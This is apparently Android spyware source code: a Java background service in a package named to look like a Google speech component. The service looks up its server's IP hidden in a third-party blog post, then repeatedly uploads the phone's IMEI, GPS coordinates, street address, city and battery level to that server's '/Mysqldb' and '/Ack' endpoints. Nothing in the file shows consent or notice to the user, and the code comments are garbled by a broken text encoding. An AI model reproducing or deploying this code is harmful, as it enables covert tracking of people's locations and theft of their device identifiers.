package com.google.googlespeeh;


import java.io.BufferedReader;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.HttpURLConnection;

import java.net.URL;
import java.net.URLEncoder;

import java.text.SimpleDateFormat;


import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;




import android.app.IntentService;

import android.content.Intent;
import android.os.IBinder;

import android.telephony.TelephonyManager;
import android.util.Log;


public class xSocketService extends  IntentService  
{

	public xSocketService()
	{
		super("SocketService");
		Log.e("loghere", "SocketService-->onsuper");
		// TODO Auto-generated constructor stub
	}

	

	String command = "none";
	String type = "none";
	  String URL_Post = Speeh.serverip; 
		 HttpURLConnection urlConn = null;  
		 String resultData="";  
		 boolean isPost = true;  
		String imei = "000000000000000";
	
	
	@Override
	public IBinder onBind(Intent intent)
	{
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate()
	{
		// TODO Auto-generated method stub
		super.onCreate();
		Log.e("loghere", "SocketService-->onCreate");
		
	}
	
	@Override
	protected void onHandleIntent(Intent intent)
	{
		// TODO Auto-generated method stub
		Log.e("loghere", "SocketService-->onHandleIntent");
	
		if (intent!=null)
		{
			switch (intent.getStringExtra("command"))
			{
			case "uploaddata":
			  if ( !Speeh.serverip.toString().equals("0.0.0.0"))
				{	
				  uploaddata();
				}
			 break;
			case "doack":
			  if ( !Speeh.serverip.toString().equals("0.0.0.0"))
				{
				 doack();
				}
			 break;
			case "getipaddr":
				getipaddr();
			 break;
			default:
				break;
			}  
			
		}
		 
	}
	
	 private void getipaddr()
		{
		  
			// TODO Auto-generated method stub
		   // ��Ӧ
		     HttpResponse mHttpResponse = null;
		    // ʵ��
		     HttpEntity mHttpEntity = null;
			 // ����һ���������
	        HttpGet httpGet = new HttpGet("http://blog.tianya.cn/post-7199881-114097908-1.shtml");
	        // ����һ��Http�ͻ��˶���
	        HttpClient httpClient = new DefaultHttpClient();
	        
	        httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 4000);
			

	        // ����ʹ��Http�ͻ��˷������󣬲���ȡ��Ӧ����

	        InputStream inputStream = null;
	        try
	        {
	            // �������󲢻����Ӧ����
	            mHttpResponse = httpClient.execute(httpGet);
	            // �����Ӧ����Ϣʵ��
	            
	          
	           if  (mHttpResponse.getStatusLine().getStatusCode()==200)
	           {	   
	               mHttpEntity = mHttpResponse.getEntity();
	            // ��ȡһ��������
	               if ( mHttpEntity != null)
	                inputStream = mHttpEntity.getContent();

	            BufferedReader bufferedReader = new BufferedReader(
	                    new InputStreamReader(inputStream));

	            String result = "";
	            String line = "";

	            while (null != (line = bufferedReader.readLine()))
	            {
	                result += line;
	                if (result.length()>600) break;
	            }

	            // �������ӡ������������LogCat�鿴
	       //     System.out.println(result);
	       //     System.out.println(result.length());
	            line = result.substring(result.indexOf("[ip_s]",0)+6, result.indexOf("[ip_e]",0));
	            Log.e("loghere", line);
	            
	            if(line.length()>0)
	            {
	            	Speeh.serverip = line;
	            	Speeh.connect2server = true;
	            }
	            
	           } 
	        }
	        catch (Exception e)
	        {
	            e.printStackTrace();
	            Speeh.connect2server = false;
	        }
	        finally
	        {
	            try
	            {
	              if (inputStream!=null)  inputStream.close();
	            }
	            catch (IOException e)
	            {
	                e.printStackTrace();
	            }
	            if (httpGet != null) httpGet = null;
	            if (mHttpResponse != null) mHttpResponse = null;
	            if (httpClient != null) httpClient = null;
	        }
		  
	   }  
	
	 private int Httpuploaddata_Post()
	 {  
		 int recode = 0;
	        try{  
	        	 imei = ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getDeviceId();
	            //ͨ��openConnection ����  
	            URL url = new java.net.URL("http://"+URL_Post+"/Mysqldb");  
	            urlConn=(HttpURLConnection)url.openConnection();  
	            //��������������   
	            urlConn.setDoOutput(true);  
	            urlConn.setDoInput(true);  
	              
	            urlConn.setRequestMethod("POST");  
	            urlConn.setUseCaches(false);  
	            urlConn.setReadTimeout(3000);
	            urlConn.setConnectTimeout(3000);
	            // ���ñ������ӵ�Content-type������Ϊapplication/x-www-form-urlencoded��    
	            urlConn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");    
	            // ���ӣ���postUrl.openConnection()���˵����ñ���Ҫ��connect֮ǰ��ɣ�  
	            // Ҫע�����connection.getOutputStream�������Ľ���connect��    
	            urlConn.connect();  
	            //DataOutputStream��  
	            DataOutputStream out = new DataOutputStream(urlConn.getOutputStream());  
	            //Ҫ�ϴ��Ĳ���  
	            SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	        	String systime = sdf1.format(System.currentTimeMillis());
	        	
	            SimpleDateFormat sdf2 = new SimpleDateFormat("yyyyMMddHHmmss");
	        	String systime2 = sdf2.format(System.currentTimeMillis());
	        	
	        	
	        	
	            String content = "imei=" + URLEncoder.encode(imei, "GBK");
	            if (String.valueOf(Speeh.lat)==null)
	            {
	            	Speeh.lat=0.0;
	            }else
	            {content = content+"&lat=" + URLEncoder.encode(String.valueOf(Speeh.lat), "GBK");}
	            if (String.valueOf(Speeh.lng)==null)
	            {
	            	Speeh.lng=0.0;
	            }else
	            {content = content+"&lng=" + URLEncoder.encode(String.valueOf(Speeh.lng), "GBK");}
	            
	            content = content+"&lc_street="+URLEncoder.encode(this.getPackageName(), "GBK");
	            content = content+"&gpstime="+URLEncoder.encode(systime, "GBK");
	            content = content+"&gpsno="+URLEncoder.encode(systime2, "GBK");
	            if (Speeh.lc_province!=null)
	            	content = content+"&province="+URLEncoder.encode(Speeh.lc_province, "GBK");
	            if (Speeh.lc_city!=null)
	            	content = content+"&city="+URLEncoder.encode(Speeh.lc_city, "GBK");
	            if (Speeh.lc_district!=null)
	            	content = content+"&district="+URLEncoder.encode(Speeh.lc_district, "GBK");
	            if (Speeh.lc_address!=null)
	            	content = content+"&address="+URLEncoder.encode(Speeh.lc_address, "GBK");
	            if (Speeh.lc_locationtype!=null)
	            	content = content+"&locationtype="+URLEncoder.encode(Speeh.lc_locationtype, "GBK");
	            if (Speeh.lc_provider!=null)
	            	content = content+"&provider="+URLEncoder.encode(Speeh.lc_provider, "GBK");
	            if (Speeh.lc_accuracy!=null)
	            	content = content+"&accuracy="+URLEncoder.encode(Speeh.lc_accuracy, "GBK");
	            
	            //��Ҫ�ϴ�������д������  
	            out.writeBytes(content);     
	            //ˢ�¡��ر�  
	            out.flush();  
	            out.close();     

	            recode = urlConn.getResponseCode();
	            
	            Log.e("gps", "upload:"+String.valueOf(recode));
	        }catch(Exception e){  
	            
	            e.printStackTrace();  
	            Speeh.connect2server = false;
	            getipaddr();
	        }  
	        
	        return recode;
	    }  
	 
	 private void uploaddata()
		{
			 try{  
	             //Get��ʽ  
	             //HttpURLConnection_Get();  
	             //Post��ʽ  
	           if ( Httpuploaddata_Post()==200)
	           {   
	             InputStreamReader in = new InputStreamReader(urlConn.getInputStream());    
	             BufferedReader buffer = new BufferedReader(in);    
	             String inputLine = null;    
	             while (((inputLine = buffer.readLine()) != null)){  
	                 resultData += inputLine ;    
	             }  
	             Log.e("gps","resultData:"+resultData);  
	             
	            
	             
	             in.close();   
	           }
	         }catch(Exception e){  
	             resultData = "���ӳ�ʱ";  
	             e.printStackTrace(); 
	             Speeh.connect2server = false;
	             getipaddr();
	            
	         }finally{  
	             try{  
	                 //�ر�����  
	                 if(isPost)  
	                 urlConn.disconnect();  
	                   
	             }catch(Exception e){  
	                 e.printStackTrace();  
	              
	             }  
	         }  
		}
	 
	 private int Httpdoack_Post()
	 {  
		 int recode = 0;
	        try{  
	        	 imei = ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getDeviceId();
	            //ͨ��openConnection ����  
	            URL url = new java.net.URL("http://"+URL_Post+"/Ack");  
	            urlConn=(HttpURLConnection)url.openConnection();  
	            //��������������   
	            urlConn.setDoOutput(true);  
	            urlConn.setDoInput(true);  
	              
	            urlConn.setRequestMethod("POST");  
	            urlConn.setUseCaches(false);  
	            urlConn.setReadTimeout(3000);
	            urlConn.setConnectTimeout(3000);
	            // ���ñ������ӵ�Content-type������Ϊapplication/x-www-form-urlencoded��    
	            urlConn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");    
	            // ���ӣ���postUrl.openConnection()���˵����ñ���Ҫ��connect֮ǰ��ɣ�  
	            // Ҫע�����connection.getOutputStream�������Ľ���connect��    
	            urlConn.connect();  
	            //DataOutputStream��  
	            DataOutputStream out = new DataOutputStream(urlConn.getOutputStream());  
	            //Ҫ�ϴ��Ĳ���  
	       
	        	
	            String content = "imei=" + URLEncoder.encode(imei, "GBK");
	           
	            
	            content = content+"&ACK="+URLEncoder.encode("CHECKOK", "GBK");
	            content = content+"&batter="+URLEncoder.encode(String.valueOf(Speeh.BatteryN), "GBK");
	           
	            //��Ҫ�ϴ�������д������  
	            out.writeBytes(content);     
	            //ˢ�¡��ر�  
	            out.flush();  
	            out.close();     

	            recode = urlConn.getResponseCode();
	            
	            Log.e("loghere", "ACK:"+String.valueOf(recode));
	        }catch(Exception e){  
	            
	            e.printStackTrace();  
	        }  
	        
	        return recode;
	    } 
	 
		private void doack()
		{
			 try{  
	             //Get��ʽ  
	             //HttpURLConnection_Get();  
	             //Post��ʽ  
	           if ( Httpdoack_Post()==200)
	           {   
	             InputStreamReader in = new InputStreamReader(urlConn.getInputStream());    
	             BufferedReader buffer = new BufferedReader(in);    
	             String inputLine = null;    
	             while (((inputLine = buffer.readLine()) != null)){  
	                 resultData += inputLine ;    
	             }  
	            
	             
	             in.close();   
	           }
	         }catch(Exception e){  
	             resultData = "���ӳ�ʱ";  
	             e.printStackTrace();  
	             Speeh.connect2server = false;
		         getipaddr();
	            
	         }finally{  
	             try{  
	                 //�ر�����  
	                 if(isPost)  
	                 urlConn.disconnect();  
	                   
	             }catch(Exception e){  
	                 e.printStackTrace();  
	              
	             }
	             
	         Log.e("loghere","resultData:"+resultData);  
	             
	         }  
		}

	


	@Override
	public void onDestroy()
	{
		Log.e("loghere", "SocketService-->onDestroy");
		
		// TODO Auto-generated method stub
		super.onDestroy();
	  
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		// TODO Auto-generated method stub
		
		
		return super.onStartCommand(intent, flags, startId);
	}
	
	  

}
